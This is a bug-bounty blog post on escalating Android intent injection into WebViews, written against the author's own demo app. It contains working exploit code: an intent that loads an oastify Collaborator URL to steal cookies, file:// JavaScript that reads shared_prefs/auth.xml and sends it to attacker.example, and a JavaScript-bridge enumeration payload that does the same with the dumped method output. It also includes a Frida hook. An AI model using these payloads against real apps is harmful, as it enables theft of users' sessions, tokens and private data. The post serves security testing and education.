---
title: Beyond the WebView Redirect — Three Escalations from a Single Intent Injection
author: nirajkharel
date: 2026-05-16 14:30:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android, Intent Injection, WebView, Exported Activity]
render_with_liquid: false
---


After the [last post on intent injection through exported activities](https://nirajkharel.com.np/posts/android-bug-bounty/), a few people reached out with the same kind of feedback. Their target apps had an exported activity, the activity took an extra parameter, the WebView loaded it — but the session-cookie-into-Burp-Collaborator ending of that post did not work for them. Either the cookie was scoped too tightly for the API to accept it, or the activity loaded the URL into a `file://` resolver, or the obvious WebView did not contain a JavaScript bridge but a deeper non-exported activity did.

The primitive is the same. The escalation is not. In this post I want to walk through three distinct bounty-worthy escalations from the same exported-activity-plus-WebView shape, and the order I work through them when I see one on a target.

<h4>Note: A vulnerable application demonstrating all three sinks is available on my <a href="https://github.com/nirajkharel/IntentInjectionPart2">Github Repo</a>.</h4>

<br>**Quick recap — what is this primitive again?**

If you have not read the previous post, the short version is this. An Android activity that is exported (either with `android:exported="true"` or implicitly via an `<intent-filter>`) can be launched by any other application on the device. If that activity reads an Intent extra and feeds it into `WebView.loadUrl()` without validation, you have an open redirect that any installed third-party app can fire. Reporting just the redirect tends to land between informational and low severity. The escalation is what makes it a real bug.

The previous post ended at session cookie theft. That is the most common escalation, but it is not the only one. There are three places this primitive ends up in practice, and which one applies depends on what the developer happened to enable on the WebView instance.

<br>**Escalation #1 — Session cookie exfiltration (the one you already know)**

Briefly: most apps share their HTTP cookie jar between the in-app WebView and the app's own networking layer. When the WebView loads your attacker URL, the GET request goes out with the user's authenticated cookies in the header. Point the URL at a Burp Collaborator host and the cookie lands in your logs.

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent();
        intent.setClassName(
            "com.root3d.intentinjection",
            "com.root3d.intentinjection.PrivacyPolicy");
        intent.putExtra("privacy-url",
            "https://f1hsbzbz62ixdg783ucnuwu2jtpkda1z.oastify.com");
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
}
```

This works most of the time. When it does not, the usual reason is one of three things. The cookies are `HttpOnly` and the WebView refuses to attach them on cross-origin requests; the cookies are scoped to a host that does not match the WebView's current origin; or the app uses bearer tokens in `Authorization` headers instead of cookies, in which case the GET request goes out clean and your Collaborator log shows nothing useful.

If you hit one of those three walls, do not write the report off. Move to escalation #2.

<br>**Escalation #2 — Arbitrary file read through the `file://` scheme**

WebViews on Android accept `file://` URLs by default. Two settings on the `WebSettings` object control how aggressive that file-reading behaviour is:

- `setAllowFileAccess(true)` — default true on most apps. Lets the WebView load files from the filesystem at all.
- `setAllowFileAccessFromFileURLs(true)` — default false on API 16+, but a surprising number of apps explicitly enable it because some old code copy-pasted from an OAuth tutorial needed it.

If the first one is on and the WebView accepts arbitrary URLs from your intent extra, you can read files inside the app's private data directory directly:

```bash
adb shell am start -n com.root3d.intentinjection/com.root3d.intentinjection.PrivacyPolicy \
  --es privacy-url "file:///data/data/com.root3d.intentinjection/shared_prefs/auth.xml"
```

The WebView renders the XML in its viewport. On a real device you do not have a screen on the WebView you can see, but you have something better — you have JavaScript. Combined with `setAllowFileAccessFromFileURLs(true)`, you can host a small HTML page locally on the attacker app's assets, point the WebView at it via `file://`, and read sibling files with XHR or `fetch`.

The attacker app drops the HTML into its own data directory, then triggers the vulnerable activity pointing at it:

```java
String exfilHtml =
    "<script>" +
    "fetch('file:///data/data/com.root3d.intentinjection/shared_prefs/auth.xml')" +
    "  .then(r => r.text())" +
    "  .then(t => fetch('https://attacker.example/?leak=' + encodeURIComponent(t)));" +
    "</script>";

File f = new File(getFilesDir(), "exfil.html");
try (FileOutputStream fos = new FileOutputStream(f)) {
    fos.write(exfilHtml.getBytes());
}

Intent intent = new Intent();
intent.setClassName(
    "com.root3d.intentinjection",
    "com.root3d.intentinjection.PrivacyPolicy");
intent.putExtra("privacy-url", "file://" + f.getAbsolutePath());
intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(intent);
```

The fetch runs inside the vulnerable application's WebView origin, which means it can read the vulnerable app's private files. The second fetch ships them to your domain. You now have the entire `shared_prefs/` directory off the device — refresh tokens, the user's email, server URLs, anything the app cached.

For bug bounty triage purposes, this is a different severity tier than cookie exfil. You are not stealing a session, you are reading the app's persistent storage directly. Sensitive token leakage or PII exposure depending on what the app stored.

<img alt="" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/intent-injection-file-read.png">

If `setAllowFileAccessFromFileURLs(false)` is set (the secure default), the cross-origin fetch fails. But notice: `setAllowFileAccess(true)` alone still lets you render a single file inside the WebView. On real targets this still leaks files that the WebView would normally not be allowed to load — log files, downloaded HTML, cached web resources — because the app's own UI shows the WebView contents on screen at some point.

<br>**Escalation #3 — JavaScript bridge RCE via `@JavascriptInterface`**

This is the highest-impact one and the one most reports miss.

Many apps attach an `@JavascriptInterface`-annotated object to their WebView so the web side can call native Android code. It is a common pattern for analytics, payment SDKs, "share to native" buttons, and anything that needs the web layer to call into Java. The interface is named at registration time:

```java
webview.addJavascriptInterface(new AppBridge(), "Android");
```

The string `"Android"` is the JavaScript variable name. From a page loaded into this WebView, `window.Android.getAuthToken()` calls into Java's `AppBridge.getAuthToken()` method. If your intent injection lets you load arbitrary URLs, your URL is now a page running in that bridge context, and you can call every method the bridge exposes.

What does this give you? Whatever the developer thought was safe to expose. In practice:

- `getAuthToken()` — your authenticated bearer token.
- `getDeviceId()` / `getInstallationId()` — durable identifiers.
- `openInternalScreen(name)` — bypass paywalls or trial gates.
- `executePayment(amount, recipient)` — yes, this exists in the wild.
- `evaluateOnNativeContext(code)` — sometimes literally `Runtime.exec` wrapped in a friendly name.

Host the payload on a domain you control or in the attacker app's assets, depending on whether the WebView accepts `https://` or `file://` for the trigger:

```html
<!doctype html>
<html><body>
<script>
  // Most apps name the bridge 'Android' or the app's brand — enumerate
  // with a tiny probe in your testing environment if you have not
  // already grepped the source.
  const names = ['Android', 'AppBridge', 'NativeBridge', 'App', 'mobile'];
  for (const n of names) {
    if (window[n] && typeof window[n] === 'object') {
      const dump = {};
      for (const key in window[n]) {
        try { dump[key] = window[n][key](); } catch (e) { dump[key] = 'err: ' + e.message; }
      }
      fetch('https://attacker.example/?bridge=' + n +
            '&dump=' + encodeURIComponent(JSON.stringify(dump)));
    }
  }
</script>
</body></html>
```

Note that this is the easy case. The harder case is when the bridge methods are protected with origin checks — the developer added `if (!window.location.origin.startsWith("https://app.example.com")) return;` somewhere. That check almost never holds up against a fully attacker-controlled URL, because the attacker can pick the origin. If the check is server-side via a `getOrigin()` callback, that is a different problem and you may need to chain through a stored XSS on the legitimate origin first.

This escalation usually lands in the high-to-critical bracket because you have moved from data exfiltration to code execution inside the app's process, with whatever permissions the app holds.

<br>**But the bridge is not on the same activity as the intent extra — now what?**

This is the case the previous post did not cover. Sometimes the obvious exported activity is the `PrivacyPolicy` screen, but its WebView has no bridge attached. The bridge lives on a different, non-exported activity — say `MainBrowserActivity` — that the obvious activity forwards to.

Search the decompiled source for two patterns:

```java
// Pattern 1: forwarded intent
intent.getParcelableExtra("android.intent.extra.INTENT");
intent.getParcelableExtra("forward.intent");
startActivity(forwardedIntent);

// Pattern 2: explicit launch with sink-side extras
Intent sink = new Intent(this, MainBrowserActivity.class);
sink.putExtra("url", getIntent().getStringExtra("privacy-url"));
startActivity(sink);
```

Both shapes mean the exported activity is a proxy. The vulnerable surface is not the activity you originally found — it is the sink it forwards to. From the attacker side, you do not change anything: the same Intent putExtra with `privacy-url` flows through the proxy and ends up controlling the sink's `WebView.loadUrl`. The bridge is on the sink.

When you are doing this manually it is easy to miss because static analysis tools that look only at "exported component → dangerous sink in the same class" will not connect the two. This is exactly the gap chain analysis closes — pairing an exported source with a non-exported sink reachable through that source's forwarding code path. If you are using a tool that surfaces these chains automatically, all three escalations show up as a single finding with the right sink classified. If you are doing it by hand, grep for `startActivity(` and `intent.putExtra(` in the exported activity's source and follow the trail.

<br>**Runtime fallback — when the source is unreadable**

R8 / ProGuard can rename the extra key strings, the activity class, and the methods to single letters. The brute-force script from the previous post handles the extra-key half. But there is a cleaner option once you have an attached Frida session.

Hook `WebView.loadUrl` and `WebView.evaluateJavascript` at runtime, then trigger the activity once with any value. The hook prints the URL the WebView is asked to load, which immediately tells you whether your extra reached the sink and what the extra key name resolved to:

```javascript
Java.perform(function () {
  const WebView = Java.use('android.webkit.WebView');
  WebView.loadUrl.overload('java.lang.String').implementation = function (url) {
    console.log('[loadUrl] ' + url);
    return this.loadUrl(url);
  };
  WebView.addJavascriptInterface.implementation = function (obj, name) {
    console.log('[bridge attached] name="' + name + '" class=' + obj.getClass().getName());
    return this.addJavascriptInterface(obj, name);
  };
});
```

Run this with `frida -U -F <pkg> -l hook.js --no-pause`, then fire the activity from your attacker app with junk values. The console prints the URL the WebView received and, if a bridge gets attached, its JavaScript variable name. Two minutes of runtime telemetry replaces an afternoon of grepping obfuscated decompiled code.

<br>**Closing — order of operations on a real target**

When I find an exported activity with a WebView sink on a target, I work the three escalations in this order:

1. **Cookie exfiltration first.** Simplest payload, simplest report, works on roughly two thirds of targets. If the cookie comes back authenticated, I do not stop at the redirect screenshot — I map the API endpoints (`/api/profile`, `/api/users/<id>`, `/delete/account`) and demonstrate confidentiality, integrity, and availability impact with the captured cookie. Same as the previous post.
2. **File read via `file://` second.** If cookies do not come back useful, I check the WebSettings for `setAllowFileAccess(true)` and try a single `file://` URL pointing at `shared_prefs/`. If it renders, I check whether `setAllowFileAccessFromFileURLs` is on and escalate to the JS exfil pattern above.
3. **JavaScript bridge RCE last.** I save this for when the first two did not pan out or when I want to push severity from medium to critical. Grep for `addJavascriptInterface` across the decompile. If anything shows up — even in third-party SDKs — try the bridge enumeration payload.

Each one is a different finding from the bounty triager's perspective: cookie exfil is account takeover, file read is sensitive data exposure, bridge RCE is code execution. Same primitive, three reports if you want to be honest with the triage team about scope, or one chained report that anchors at the highest severity if you want the cleaner write-up.

The trap I want you to avoid is the one I fell into when I started — finding the open redirect, writing the cookie exfil PoC, getting paid the medium bounty, and moving on. Sometimes the bigger bug is the second sink on the same primitive. It costs you an extra hour of grepping. It can be the difference between a medium and a critical.

Happy Hacking !!
